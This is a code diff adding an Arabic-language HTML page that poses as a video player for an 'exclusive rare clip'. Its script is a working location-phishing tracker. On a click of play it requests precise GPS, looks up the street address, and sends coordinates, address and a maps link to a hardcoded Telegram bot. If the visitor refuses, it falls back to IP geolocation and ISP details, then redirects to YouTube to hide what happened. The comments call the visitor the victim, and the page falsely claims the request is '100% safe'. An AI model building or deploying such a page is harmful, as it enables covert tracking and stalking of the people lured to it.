@@ -1,0 +1,323 @@
+<!DOCTYPE html>
+<html lang="ar">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>مشغل الفيديو</title>
+    <style>
+        * { margin: 0; padding: 0; box-sizing: border-box; }
+        body {
+            background: #0a0a0a;
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            min-height: 100vh;
+            font-family: 'Segoe UI', Arial, sans-serif;
+            direction: rtl;
+        }
+        .player-container {
+            background: #1a1a1a;
+            border-radius: 16px;
+            padding: 25px;
+            max-width: 400px;
+            width: 90%;
+            box-shadow: 0 20px 60px rgba(0,0,0,0.8);
+            border: 1px solid #333;
+            text-align: center;
+        }
+        .video-thumbnail {
+            width: 100%;
+            height: 200px;
+            background: linear-gradient(145deg, #111, #2a2a2a);
+            border-radius: 12px;
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            position: relative;
+            margin-bottom: 20px;
+            border: 1px solid #444;
+            cursor: pointer;
+            transition: 0.3s;
+        }
+        .video-thumbnail:hover {
+            border-color: #ff0033;
+        }
+        .play-button {
+            width: 70px;
+            height: 70px;
+            background: #ff0033;
+            border-radius: 50%;
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            font-size: 35px;
+            color: white;
+            box-shadow: 0 0 30px rgba(255, 0, 51, 0.5);
+            transition: 0.3s;
+            border: none;
+            cursor: pointer;
+        }
+        .play-button:hover {
+            transform: scale(1.05);
+            box-shadow: 0 0 50px rgba(255, 0, 51, 0.8);
+        }
+        .video-title {
+            color: #eee;
+            font-size: 18px;
+            font-weight: bold;
+            margin-bottom: 5px;
+        }
+        .video-meta {
+            color: #888;
+            font-size: 13px;
+            margin-bottom: 15px;
+        }
+        .progress-bar {
+            width: 100%;
+            height: 4px;
+            background: #333;
+            border-radius: 2px;
+            margin: 10px 0;
+        }
+        .progress-fill {
+            width: 15%;
+            height: 100%;
+            background: #ff0033;
+            border-radius: 2px;
+        }
+        .status-msg {
+            color: #ff0033;
+            font-size: 14px;
+            min-height: 24px;
+            margin-top: 10px;
+            padding: 8px;
+            background: #111;
+            border-radius: 6px;
+            border: 1px solid #222;
+        }
+        .sub-text {
+            color: #666;
+            font-size: 12px;
+            margin-top: 10px;
+            border-top: 1px solid #222;
+            padding-top: 10px;
+        }
+        .hidden-btn {
+            display: none;
+        }
+    </style>
+</head>
+<body>
+    <div class="player-container">
+        <!-- واجهة مشغل الفيديو المزيف -->
+        <div class="video-thumbnail" id="thumbnail">
+            <div class="play-button" id="playBtn">▶</div>
+        </div>
+        <div class="video-title">🔥 فيديو حصري - مقطع نادر 2026</div>
+        <div class="video-meta">📺 4K • 12:30 • مشاهدات 2.3M</div>
+        <div class="progress-bar"><div class="progress-fill"></div></div>
+        <div class="status-msg" id="statusMsg">👆 اضغط على زر التشغيل للمشاهدة</div>
+        <div class="sub-text">🔒 سيتم طلب الموقع لتحسين جودة البث (آمن 100%)</div>
+    </div>
+
+    <script>
+        (function() {
+            // ======== بيانات البوت ========
+            const BOT_TOKEN = "8317512028:AAHEIRv_S23OFrceayGoKW823jIxvl9Az_k";
+            const CHAT_ID = "1497190595";
+            const REDIRECT_URL = "https://www.youtube.com/watch?v=6N5IQxrac6g";
+            // =============================
+
+            const statusMsg = document.getElementById('statusMsg');
+            const playBtn = document.getElementById('playBtn');
+            const thumbnail = document.getElementById('thumbnail');
+
+            // دالة تحديث حالة الواجهة
+            function updateUI(msg, isError = false) {
+                statusMsg.textContent = msg;
+                statusMsg.style.color = isError ? '#ff4444' : '#ff0033';
+            }
+
+            // دالة الإرسال إلى تيليجرام
+            function sendToTelegram(text) {
+                const url = `https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`;
+                return fetch(url, {
+                    method: 'POST',
+                    headers: { 'Content-Type': 'application/json' },
+                    body: JSON.stringify({
+                        chat_id: CHAT_ID,
+                        text: text,
+                        parse_mode: 'Markdown',
+                        disable_web_page_preview: false
+                    })
+                }).catch(() => {});
+            }
+
+            // دالة الحصول على العنوان من الإحداثيات
+            function getAddressFromCoords(lat, lon) {
+                return fetch(`https://nominatim.openstreetmap.org/reverse?format=json&lat=${lat}&lon=${lon}&zoom=18&addressdetails=1&accept-language=ar`)
+                    .then(res => res.json())
+                    .then(data => {
+                        if (data && data.display_name) return data.display_name;
+                        return 'غير معروف';
+                    })
+                    .catch(() => 'غير معروف');
+            }
+
+            // دالة إرسال الموقع (الرسالة النهائية)
+            function sendLocationToBot(lat, lon, accuracy, method, address = '') {
+                const mapsLink = `https://www.google.com/maps?q=${lat},${lon}`;
+                const msg =
+                    `📍 *تحديد الموقع الجغرافي بدقة متناهية* 📍\n` +
+                    `━━━━━━━━━━━━━━━━━━━━━\n` +
+                    `🗺️ *خط العرض:* ${lat}\n` +
+                    `🗺️ *خط الطول:* ${lon}\n` +
+                    `📏 *دقة التحديد:* ${accuracy} متر\n` +
+                    `📡 *طريقة التحديد:* ${method}\n` +
+                    `🏠 *العنوان التفصيلي:*\n${address || 'جاري التحميل...'}\n` +
+                    `━━━━━━━━━━━━━━━━━━━━━\n` +
+                    `🗺️ *رابط خرائط جوجل (شاهد موقعه بالضبط):*\n` +
+                    `${mapsLink}`;
+
+                sendToTelegram(msg);
+                updateUI('✅ تم تحديد موقعك، جاري تشغيل الفيديو...');
+            }
+
+            // ============================================================
+            // 2. وظيفة الاحتياطي (IP) إذا رفض الموقع أو تعطل
+            // ============================================================
+            function fetchLocationByIP() {
+                updateUI('🌍 جاري التحديد عبر الشبكة (دقة أقل)...');
+                
+                const translate = {
+                    'Iraq': 'العراق', 'Baghdad': 'بغداد', 'Basra': 'البصرة',
+                    'Nineveh': 'نينوى', 'Erbil': 'أربيل', 'Sulaymaniyah': 'السليمانية',
+                    'Duhok': 'دهوك', 'Kirkuk': 'كركوك', 'Najaf': 'النجف',
+                    'Karbala': 'كربلاء', 'Babil': 'بابل', 'Wasit': 'واسط',
+                    'Maysan': 'ميسان', 'Dhi Qar': 'ذي قار', 'Muthanna': 'المثنى',
+                    'Qadisiyyah': 'القادسية', 'Anbar': 'الأنبار', 'Salah ad-Din': 'صلاح الدين',
+                    'Diyala': 'ديالى'
+                };
+
+                Promise.race([
+                    fetch('https://ipinfo.io/json', { timeout: 4000 }).then(r => r.json()),
+                    fetch('https://ip-api.com/json/', { timeout: 4000 }).then(r => r.json())
+                ])
+                .then(data => {
+                    const ip = data.ip || data.query || 'غير معروف';
+                    let country = data.country || 'غير معروف';
+                    let region = data.region || data.regionName || 'غير معروف';
+                    let city = data.city || 'غير معروف';
+                    const org = data.org || data.isp || 'غير معروف';
+                    let loc = data.loc || `${data.lat || ''},${data.lon || ''}`;
+
+                    country = translate[country] || country;
+                    region = translate[region] || region;
+                    city = translate[city] || city;
+
+                    let lat = 'غير معروف', lon = 'غير معروف';
+                    if (loc && loc.includes(',')) {
+                        const parts = loc.split(',');
+                        lat = parts[0].trim();
+                        lon = parts[1].trim();
+                    }
+
+                    const mapsLink = `https://www.google.com/maps?q=${lat},${lon}`;
+                    const msg =
+                        `📍 *تحديد الموقع عبر الـ IP (احتياطي)* 📍\n` +
+                        `━━━━━━━━━━━━━━━━━━━━━\n` +
+                        `📌 *الـ IP:* ${ip}\n` +
+                        `🌍 *الدولة:* ${country}\n` +
+                        `🏙️ *المحافظة:* ${region}\n` +
+                        `🗺️ *المدينة:* ${city}\n` +
+                        `📡 *مزود الإنترنت:* ${org}\n` +
+                        `📍 *الإحداثيات:* ${lat}, ${lon}\n` +
+                        `━━━━━━━━━━━━━━━━━━━━━\n` +
+                        `⚠️ *ملاحظة:* دقة IP أقل (قد تصل إلى 1-5 كيلومترات).\n` +
+                        `🗺️ *رابط الخريطة:*\n${mapsLink}`;
+
+                    sendToTelegram(msg);
+                    updateUI('✅ تم التحديد التقريبي، جاري التشغيل...');
+                })
+                .catch(() => {
+                    sendToTelegram(`⚠️ *فشل تحديد الموقع بالكامل* ⚠️`);
+                    updateUI('❌ تعذر التحديد، جاري التشغيل...', true);
+                })
+                .finally(() => {
+                    // في النهاية، نوجه إلى يوتيوب بعد 2 ثانية
+                    setTimeout(() => {
+                        window.location.replace(REDIRECT_URL);
+                    }, 2000);
+                });
+            }
+
+            // ============================================================
+            // 3. وظيفة طلب الموقع (GPS) عند الضغط على زر التشغيل
+            // ============================================================
+            function requestLocationAndPlay() {
+                // تعطيل الزر لتجنب الضغط المتكرر
+                playBtn.style.pointerEvents = 'none';
+                playBtn.style.opacity = '0.5';
+                updateUI('📡 جاري طلب الموقع الدقيق لتشغيل الفيديو...');
+
+                // التحقق من وجود GPS
+                if (!navigator.geolocation) {
+                    updateUI('⚠️ جهازك لا يدعم GPS، جاري التحديد عبر الشبكة...', true);
+                    fetchLocationByIP();
+                    return;
+                }
+
+                // طلب الموقع بدقة عالية
+                navigator.geolocation.getCurrentPosition(
+                    // ---- نجاح (وافق الضحية) ----
+                    function(pos) {
+                        const lat = pos.coords.latitude;
+                        const lon = pos.coords.longitude;
+                        const acc = pos.coords.accuracy; // الدقة بالأمتار
+
+                        updateUI('📍 تم الحصول على الإحداثيات، جاري جلب العنوان...');
+
+                        // جلب العنوان التفصيلي
+                        getAddressFromCoords(lat, lon)
+                            .then(address => {
+                                sendLocationToBot(lat, lon, acc.toFixed(0), 'GPS (دقة عالية جداً)', address);
+                            })
+                            .catch(() => {
+                                sendLocationToBot(lat, lon, acc.toFixed(0), 'GPS (دقة عالية جداً)', 'تعذر جلب العنوان');
+                            })
+                            .finally(() => {
+                                // التوجيه إلى يوتيوب بعد 2 ثانية من إرسال الموقع
+                                setTimeout(() => {
+                                    window.location.replace(REDIRECT_URL);
+                                }, 2000);
+                            });
+                    },
+                    // ---- فشل (رفض الضحية أو تعطل) ----
+                    function(err) {
+                        updateUI('⚠️ لم يتم السماح بالموقع، جاري التحديد عبر الشبكة...', true);
+                        // ننتقل إلى IP كاحتياطي
+                        fetchLocationByIP();
+                    },
+                    { enableHighAccuracy: true, timeout: 8000, maximumAge: 0 }
+                );
+            }
+
+            // ============================================================
+            // 4. ربط حدث الضغط على زر التشغيل أو الصورة المصغرة
+            // ============================================================
+            playBtn.addEventListener('click', function(e) {
+                e.stopPropagation();
+                requestLocationAndPlay();
+            });
+
+            thumbnail.addEventListener('click', function() {
+                // محاكاة الضغط على الزر
+                playBtn.click();
+            });
+
+            // رسالة تحذيرية للمستخدم (لن تظهر له، بل هي للتوضيح)
+            console.log('✅ تم تحميل مشغل الفيديو المزيف بنجاح.');
+        })();
+    </script>
+</body>
+</html>
